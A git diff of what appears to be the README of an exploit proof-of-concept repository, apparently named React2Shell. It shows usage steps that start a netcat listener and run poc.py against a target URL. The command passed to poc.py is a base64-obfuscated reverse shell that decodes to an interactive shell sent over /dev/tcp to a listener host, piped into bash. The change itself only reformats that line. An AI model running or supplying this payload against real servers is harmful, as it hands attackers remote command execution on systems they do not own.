@@ -93,8 +93,7 @@ git clone https://github.com/snipevx/React2Shell-POC.git && cd React2Shell-POC
 # start a netcat listener on your specified port
 nc -lvnp 1337
 
-python poc.py -u http://127.0.0.1:3000/ -c \
- 'echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xOS4xMjgvMTMzNyAwPiYx|base64 -d|bash'
+python poc.py -u http://127.0.0.1:3000/ -c 'echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xOS4xMjgvMTMzNyAwPiYx|base64 -d|bash'
 ```
 
 ![](screenshots/Pasted%20image%2020260213122045.png)
